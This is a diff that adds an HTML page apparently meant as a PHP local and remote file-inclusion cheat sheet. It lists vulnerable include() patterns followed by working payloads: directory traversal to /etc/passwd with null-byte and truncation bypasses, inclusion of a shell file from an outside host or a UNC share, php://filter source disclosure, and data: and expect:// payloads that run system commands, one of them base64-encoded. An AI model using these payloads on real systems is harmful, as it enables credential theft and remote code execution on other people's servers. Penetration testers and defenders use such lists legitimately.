@@ -1,0 +1,68 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Standard</title>
+</head><body><b>Limited Local File Inclusion</b>: &lt;?php include(&quot;inc/&quot; . $_GET['file'] . &quot;.htm&quot;); ?&gt;<br/>
+Null Byte Injection:<br/>
+?file=../../../../../../../../../etc/passwd%00<br/>
+(requires magic_quotes_gpc=off)<br/>
+Directory Listing with Null Byte Injection:<br/>
+?file=../../../../../../../../../var/www/accounts/%00<br/>
+(UFS filesystem only, requires magic_quotes_gpc=off, more details <a href="https://websec.wordpress.com/2009/11/28/freebsd-directory-listing-with-php-file-functions/">here</a>)<br/>
+Path Truncation:<br/>
+?file=../../../../../../../../../etc/passwd.\.\.\.\.\.\.\.\.\.\.\ …<br/>
+(more details see <a href="http://www.ush.it/2009/02/08/php-filesystem-attack-vectors/">here</a>and <a href="http://www.ush.it/2009/07/26/php-filesystem-attack-vectors-take-two/">here</a>)<br/>
+Dot Truncation:<br/>
+?file=../../../../../../../../../etc/passwd……………. …<br/>
+(Windows only, more details <a href="http://www.notsosecure.com/folder2/2010/02/02/local-file-inclusion-with-magic_quotes_gpc-enabled/">here</a>)<br/>
+Reverse Path Truncation:<br/>
+?file=../../../../ […] ../../../../../etc/passwd<br/>
+(more details <a href="http://ptresearch.blogspot.com/2010/08/another-alternative-for-null-byte.html">here</a>).<br/>
+<br/>
+<b>Basic Remote File Inclusion</b>&lt;?php include($_GET['file']); ?&gt;<br/>
+Including Remote Code:<br/>
+?file=[http|https|ftp]://websec.wordpress.com/shell.txt<br/>
+(requires allow_url_fopen=On and allow_url_include=On)<br/>
+Using PHP stream php://input:<br/>
+?file=php://input<br/>
+(specify your payload in the POST parameters, watch urlencoding, details <a href="http://php.net/manual/en/wrappers.php.php">here</a>, requires<br/>
+allow_url_include=On)<br/>
+Using PHP stream php://filter:<br/>
+?file=php://filter/convert.base64-encode/resource=index.php<br/>
+(lets you read PHP source because it wont get evaluated in base64. More details <a href="http://diablohorn.wordpress.com/2010/01/16/interesting-local-file-inclusion-method/">here</a>and <a href="http://php.net/manual/en/wrappers.php.php">here</a>)<br/>
+Using data URIs:<br/>
+?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=<br/>
+(requires allow_url_include=On)<br/>
+Using XSS:<br/>
+?file=http://127.0.0.1/path/xss.php?xss=phpcode<br/>
+(makes sense if firewalled or only whitelisted domains allowed)<br/>
+<br/>
+<b>Limited Remote File Inclusion</b>&lt;?php include($_GET['file'] . &quot;.htm&quot;); ?&gt;<br/>
+?file=https://websec.wordpress.com/shell<br/>
+?file=https://websec.wordpress.com/shell.txt?<br/>
+?file=https://websec.wordpress.com/shell.txt%23<br/>
+(requires allow_url_fopen=On and allow_url_include=On)<br/>
+?file=\\evilshare\shell.php<br/>
+(bypasses allow_url_fopen=Off)<br/>
+<br/>
+<b>Static Remote File Inclusion</b>: &lt;?php include(&quot;http://192.168.1.10/config.php&quot;); ?&gt;<br/>
+Man In The Middle<br/>
+(lame indeed, but often forgotten)<br/>
+<br/>
+<b>Filter evasion</b><br/>
+Access files with wildcards (read more <a href="http://upshell.wordpress.com/2011/06/11/new-vulnerabilities-to-access-files-in-php/">here</a>)<ul><li style="list-style-type: none"/>
+</ul>
+<b>Cookie variable inclusion</b>:<br/>
+javascript:document.cookie=&quot;lan=../../../../../etc/passwd%00″;<br/>
+<br/>
+<b>PHP filters</b><br/>
+?file=php://filter/convert.base64-encode/resource=index<br/>
+?file=php://input		payload sent in POST request<br/>
+?file=php://data<br/>
+data:text/plain,&lt;?php phpinfo(); ?&gt;<br/>
+data:,&lt;?system($_GET['x']);?&gt;&amp;x=ls<br/>
+data:,&lt;?php system($_GET['x']); ?&gt;&amp;x=ls<br/>
+data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&amp;x=ls<br/>
+?file=php://filter/read=convert.base64-encode/resource=config	same, but add a filter/read<br/>
+?file=expect://ls<br/>
+</body></html>
